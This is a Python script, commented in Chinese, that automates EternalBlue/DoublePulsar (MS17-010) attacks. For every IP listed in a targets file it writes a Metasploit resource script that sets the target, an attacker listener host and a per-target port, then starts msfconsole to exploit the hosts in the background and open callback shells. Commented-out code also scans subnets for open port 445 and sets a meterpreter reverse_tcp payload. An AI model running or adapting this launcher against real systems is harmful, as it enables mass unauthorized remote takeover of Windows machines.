import optparse
# from IPy import IP
# import nmap
import os
# def find_target(host):
#     target_list = []  # 创建一个列表用来存放主机存活且开放445端口的列表
#     for target in IP(str(host))[1:]:  # 利用IPy类里面的IP()库转换成每个单独的ip
#         target = str(target)
#         scanner = nmap.PortScanner()  # 初始化一个PortScanner()类对象
#         rst = scanner.scan(target, '445')  # 对目标的445端口进行扫描
#         if rst['nmap']['scanstats']['uphosts'] == '0':  # 判断目标主机是否存活
#             print('Host not up:' + target)  # 用户交互输出
#             continue
#         state = rst['scan'][target]['tcp'][445]['state']  # 记录445端口的开放状态
#         if state == 'open':  # 进行端口状态的判断
#             target_list.append(target)  # 如果端口开放,将主机ip加入到列表
#             print(str(target) + ' with 445 port open, there may be a vulnerability in ms17_010')
#         else:
#             print(str(target) + ' 445 port not open!')
#     return target_list
def create_file(configfile, target, lhost):
    configfile.write('use windows/smb/eternalblue_doublepulsar\n')  # 使用ms17_010利用模块
    configfile.write('set rhost ' + target + '\n')  # 设置rhost
    #configfile.write('set payload windows/x64/meterpreter/reverse_tcp\n')  # 设置payload
    lport = 4444 + int(target.split('.')[-1])  # 本地监听端口根据ip地址进行计算,防止多个shell产生端口冲突的问题
    configfile.write('set lport ' + str(lport) + '\n')  # 设置lport
    configfile.write('set lhost ' + str(lhost) + '\n')  # 设置lhost
    configfile.write('set winepath /Users/chenser/.wine/drive_c' + '\n')
    configfile.write('set DOUBLEPULSARPATH /Users/chenser/Desktop/Tools/penetration/Eternalblue-Doublepulsar-Metasploit/deps' + '\n')
    configfile.write('set ETERNALBLUEPATH /Users/chenser/Desktop/Tools/penetration/Eternalblue-Doublepulsar-Metasploit/deps' + '\n')
    configfile.write('set target 8' + '\n')  # 设置目标机器为Windows7
    # configfile.write('set target 7' + '\n')  # 设置目标机器为Windows Server 2008 R2
    # configfile.write('set target 6' + '\n')  # 设置目标机器为Windows Server 2008
    configfile.write('exploit -j -z\n')  # 在后台且不与用户交互运行
    print("Your shell will created at " + str(lhost) + ":" + str(lport))
def main():
    parser = optparse.OptionParser('%prog -L <lhost>')  # 构造optionparser的对象并且给用户一个说明文档
    # parser.add_option('-H', dest='host', type='string')  # 在对象中增加参数选项
    parser.add_option('-L', dest='lhost', type='string')
    (options, args) = parser.parse_args()  # 调用optionparser的解析函数,解析用户输入的命令
    lhost = options.lhost
    targets_file = open("targets.txt")
    target_list=targets_file.readlines()
    for target in target_list:
        print(target)
        configfile = open('meta(x86).rc', 'a')
        create_file(configfile, target, lhost)
        configfile.close()
    # os.system('rvm use ruby-2.7.2')
    # os.system('sudo bundle install')
    command = '/opt/metasploit-framework/embedded/framework/msfconsole -r meta(x86).rc'
    os.system(command)
if __name__ == '__main__':
    main()
